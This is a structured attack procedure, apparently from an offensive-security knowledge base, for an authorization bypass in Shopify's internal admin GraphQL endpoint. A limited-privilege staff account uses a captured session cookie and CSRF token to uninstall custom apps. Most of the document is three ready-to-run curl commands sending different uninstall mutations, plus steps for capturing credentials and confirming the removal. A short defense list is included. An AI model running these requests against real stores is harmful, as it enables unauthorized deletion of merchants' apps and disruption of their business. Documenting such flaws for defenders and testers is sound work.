---
id: proc-execute-graphql-app-uninstall-mutation
tags:
  - auth-bypass
  - shopify
  - graphql
  - uninstall
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/shopify-uninstall-custom-app-graphql]]'
  - '[[commands/shopify-remove-channel-graphql]]'
  - '[[commands/shopify-app-uninstall-update-graphql]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:19.725Z'
skill_level: intermediate
impact_level: low
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Execute-GraphQL-App-Uninstall-Mutation

## Summary

This procedure exploits an authorization bypass in Shopify's GraphQL API by sending mutations to uninstall custom apps using a limited-privilege staff account, succeeding despite missing 'Develop apps' permission.

## Description

The vulnerability lies in insufficient permission checks for mutations like UninstallCustomApp, RemoveChannel, and AppUninstallUpdate at /admin/internal/web/graphql/core. Using staff cookies and CSRF tokens, these requests bypass checks, allowing app deletion and potential disruption. Target environment: Shopify admin API over HTTPS. Prerequisites: Valid staff session and app ID.

## Requirements

1. Staff session cookie and CSRF token
2. Target app global ID
3. HTTP client like curl
4. Network access to Shopify domain

## Defense

Defensive measures and detection strategies:

- Strengthen GraphQL resolvers with explicit permission validation for 'Develop apps'
- Monitor GraphQL mutation logs for uninstall operations from low-priv users
- Implement rate limiting on app management endpoints
- Audit staff permissions post-incident

## Objectives

1. Perform unauthorized app uninstall via GraphQL
2. Confirm bypass with multiple mutation variants
3. Validate integrity impact by checking app removal

## Instructions

### Step 1: Prepare Authentication

**Context**: Obtain session details for authenticated requests.

1. Log in as limited staff.
2. Capture Cookie from dev tools.
3. Fetch CSRF token via a GET to admin page or meta tag.

**Expected Output**: Valid cookie and token strings.

### Step 2: Execute Primary Uninstall Mutation

**Context**: Send UninstallCustomApp to remove the app.

**Command** ([[commands/shopify-uninstall-custom-app-graphql]]):
```bash
curl -X POST 'https://example.myshopify.com/admin/internal/web/graphql/core?operation=AccountEdit&type=query' -H 'Cookie: your_session_cookie' -H 'X-Csrf-Token: your_csrf_token' -H 'Content-Type: application/json' -d '{"operationName":"UninstallCustomApp","variables":{"appId":"gid://shopify/App/6431859"},"query":"mutation UninstallCustomApp($appId: ID!) { appUninstall(input: {id: $appId}) { app { id __typename } userErrors { field message __typename } __typename } }"}'
```

> This mutation targets the app ID; success returns no userErrors.

### Step 3: Try Alternative Mutations if Needed

**Context**: Use RemoveChannel or AppUninstallUpdate as fallbacks.

**Command** ([[commands/shopify-remove-channel-graphql]]):
```bash
curl -X POST 'https://example.myshopify.com/admin/internal/web/graphql/core?operation=RemoveChannel&type=mutation' -H 'Cookie: your_session_cookie' -H 'X-Csrf-Token: your_csrf_token' -H 'Content-Type: application/json' -d '{"operationName":"RemoveChannel","variables":{"input":{"id":"gid://shopify/App/6431853","feedbackDescription":""}},"query":"mutation RemoveChannel($input: AppUninstallInput!) { appUninstall(input: $input) { app { id title __typename } userErrors { field message __typename } __typename } }"}'
```

> Alternative for channel-based removal.

**Command** ([[commands/shopify-app-uninstall-update-graphql]]):
```bash
curl -X POST 'https://example.myshopify.com/admin/internal/web/graphql/core?operation=AppUninstallUpdate&type=mutation' -H 'Cookie: your_session_cookie' -H 'X-Csrf-Token: your_csrf_token' -H 'Content-Type: application/json' -d '{"operationName":"AppUninstallUpdate","variables":{"input":{"id":"gid://shopify/App/6431859","feedback":null,"feedbackDescription":null,"extraAttributes":null}},"query":"mutation AppUninstallUpdate($input: AppUninstallInput!) { appUninstall(input: $input) { app { title isChannel __typename } userErrors { field message __typename } __typename } }"}'
```

> Update-based uninstall variant.

### Step 4: Verify Removal

**Context**: Check admin panel for app absence.

1. Refresh Apps list.
2. Confirm target app is gone.

**Expected Output**: App no longer listed; any linked functionality broken.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/shopify-uninstall-custom-app-graphql]]
- [[commands/shopify-remove-channel-graphql]]
- [[commands/shopify-app-uninstall-update-graphql]]

## Tools Used


## Tags

- auth-bypass
- graphql
- shopify
- uninstall
